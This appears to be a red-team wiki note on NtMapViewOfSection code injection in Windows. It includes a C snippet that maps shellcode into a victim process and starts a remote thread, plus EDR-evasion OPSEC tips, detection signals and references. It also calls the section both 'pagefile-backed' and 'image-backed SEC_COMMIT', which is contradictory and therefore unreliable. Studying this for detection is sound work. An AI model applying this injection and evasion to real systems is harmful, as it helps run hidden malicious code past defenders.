---
title: NtMapViewOfSection Injection
slug: ntmapviewofsection-injection
---

> **TL;DR:** Create a pagefile-backed section with `NtCreateSection`, map it RW in the attacker and RX in the victim, write shellcode through the local view, then fire `RtlCreateUserThread` at the remote view — code injection without a single `WriteProcessMemory` call or RWX page.

## What it is
A native-API code injection primitive that abuses Windows shared memory sections. `NtCreateSection` produces a kernel section object; `NtMapViewOfSection` projects views of that section into arbitrary processes with independent protections. By choosing `PAGE_READWRITE` locally and `PAGE_EXECUTE_READ` remotely, the attacker avoids both `WriteProcessMemory` and the telltale RWX private commit pattern that triggers many EDR memory scanners.

## Preconditions / where it applies
- Handle to the victim process with `PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD`
- Same-session, same-architecture target (cross-arch mapping is painful)
- Ntdll exports `NtCreateSection`, `NtMapViewOfSection`, `RtlCreateUserThread` — resolve via `GetProcAddress` or syscall stubs

## Technique
Allocate a section the size of the shellcode, map a local RW view, `memcpy` the payload, map a remote RX view into the target, then spin a remote thread whose start address is the remote view's base. No `VirtualAllocEx`, no `WriteProcessMemory`, no `PAGE_EXECUTE_READWRITE`.

```c
LARGE_INTEGER size = { .QuadPart = sizeof(shellcode) };
NtCreateSection(&hSec, SECTION_ALL_ACCESS, NULL, &size,
                PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

PVOID local = NULL; SIZE_T sz = 0;
NtMapViewOfSection(hSec, GetCurrentProcess(), &local, 0, 0, NULL,
                   &sz, 2 /*ViewUnmap*/, 0, PAGE_READWRITE);
memcpy(local, shellcode, sizeof(shellcode));

PVOID remote = NULL;
NtMapViewOfSection(hSec, hVictim, &remote, 0, 0, NULL,
                   &sz, 2, 0, PAGE_EXECUTE_READ);
RtlCreateUserThread(hVictim, NULL, FALSE, 0, 0, 0, remote, NULL, &hThr, NULL);
```

OPSEC: the section is image-backed `SEC_COMMIT`, so it appears as MEM_MAPPED rather than MEM_PRIVATE — bypasses naive "executable private memory" hunts. Indirect syscalls further reduce userland hook visibility.

## Detection and defence
- ETW-TI `NtCreateSection` + `NtMapViewOfSection` across process boundaries with executable remote protection is a strong signal
- Sysmon EID 8 (CreateRemoteThread) on a thread whose start address resides in mapped (not image) memory
- Memory scanners (PE-sieve, Moneta) flag `MEM_MAPPED` executable views unbacked by a file on disk

## References
- [ired.team — NtCreateSection + NtMapViewOfSection injection](https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection) — original walkthrough
- [MITRE ATT&CK T1055.001](https://attack.mitre.org/techniques/T1055/001/) — DLL/shared section injection mapping

Related: [[process-injection-techniques]], [[process-hollowing]]
